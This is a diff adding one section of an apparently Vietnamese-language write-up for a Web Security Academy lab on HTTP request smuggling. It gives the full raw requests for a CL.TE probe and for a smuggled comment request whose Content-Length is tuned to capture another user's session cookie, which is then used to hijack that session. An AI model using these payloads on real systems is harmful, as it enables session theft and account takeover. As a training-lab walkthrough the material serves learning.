@@ -306,6 +306,68 @@ x=
 Sau khi submit 2 lần, ta truy cập trang admin thành công. Tiếp đó, để xóa user carlos, ta thực hiện cách tương tự với request `GET /admin/delete?username=carlos`. Kết quả, bài lab được giải.
 
 # 9. Exploiting HTTP request smuggling to capture other users' requests
+Thử submit request sau:
+```
+POST / HTTP/1.1
+Host: 0a3600630365932cc03f4aca00d3005d.web-security-academy.net
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 12
+Transfer-Encoding: chunked
+
+1
+x
+0
+
+X
+```
+Submit 3 lần ta thấy response trả về "Not Found", dấu hiệu cho thấy website có lỗ hổng CL.TE. Nhận thấy trong website có chức năng comment, để bắt request của user khác ta cấu hình request sau:
+```
+POST / HTTP/1.1
+Host: 0a3600630365932cc03f4aca00d3005d.web-security-academy.net
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 296
+Transfer-Encoding: chunked
+
+1
+x
+0
+
+POST /post/comment HTTP/1.1
+Host: 0a3600630365932cc03f4aca00d3005d.web-security-academy.net
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 100
+
+csrf=9JtAo1TnsWjcposKCSyjNbXvR0uurKQK&postId=9&name=test&email=test%40gmail.com&website=https%3A%2F%2Ftest.com&comment=
+```
+Khi đó, nội dung comment của smuggled request sẽ trở thành các header của request tiếp theo. Sau khi submit, ta truy cập `GET /post?postId=9` thì thấy comment:
+
+![image](https://user-images.githubusercontent.com/103978452/225261015-41a9bff4-7464-41ad-8223-5d014f18d49f.png)
+
+Tuy nhiên nhận thấy Cookie header vẫn chưa có trong comment. Như vậy ta cần điều chỉnh Content-Length trong smuggled request để có thể thấy được Cookie của user.
+
+Sau một vài lần thử, ta có request cuối cùng như sau:
+```
+POST / HTTP/1.1
+Host: 0a3600630365932cc03f4aca00d3005d.web-security-academy.net
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 340
+Transfer-Encoding: chunked
+
+0
+
+POST /post/comment HTTP/1.1
+Host: 0a3600630365932cc03f4aca00d3005d.web-security-academy.net
+Cookie: session=bvniqBliOdRmqDH9ch1CrJe8exJpXD6h
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 916
+
+csrf=9JtAo1TnsWjcposKCSyjNbXvR0uurKQK&postId=9&name=damn&email=test%40gmail.com&website=https%3A%2F%2Ftest.com&comment=
+```
+Submit request, đợi một thời gian để user gửi request rồi refresh trang bài viết, ta thấy comment sau:
+
+![image](https://user-images.githubusercontent.com/103978452/225258173-1c4d581d-9832-40a8-ad7e-cfb5b1d85081.png)
+
+Như vậy, ta lấy được session của user `session=VyERtqn8lwKR4QWQdHAHaRjcSrWmeYhi`. Thay thế với cookie hiện tại rồi refresh, kết quả thành công.
 
 # 10. Exploiting HTTP request smuggling to deliver reflected XSS
 
